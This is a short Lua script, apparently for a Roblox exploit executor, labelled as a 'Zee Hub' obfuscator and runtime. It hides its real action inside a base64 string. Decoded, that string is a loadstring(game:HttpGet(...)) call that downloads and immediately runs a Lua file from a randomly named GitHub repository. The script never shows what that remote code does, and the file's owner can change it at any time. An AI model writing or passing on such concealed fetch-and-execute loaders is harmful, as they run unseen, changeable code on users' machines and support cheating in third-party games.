-- [Zee Hub 2026 VM Obfuscator & Execution Runtime]
-- Protected & Executable
local _ENV = (getgenv or getfenv)();
local _PAYLOAD = "bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ramZqZmg5ODQ3cmhicmpmamRudGpkaXcyaTR1Nzc3L1plZS5sdWEvcmVmcy9oZWFkcy9tYWluL1pFRS5sdWEiKSkoKQ==";

local function _DECODE(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    data = string.gsub(data, '[^'..b..'=]', '');
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1);
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0;
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c);
    end))
end

-- ถอดรหัสและรันคำสั่งจริงทันทีเมื่อ Executor สั่งรัน
local success, res = pcall(function()
    return loadstring(_DECODE(_PAYLOAD))();
end);

if not success then
    warn("Zee Hub VM Error: " .. tostring(res));
end
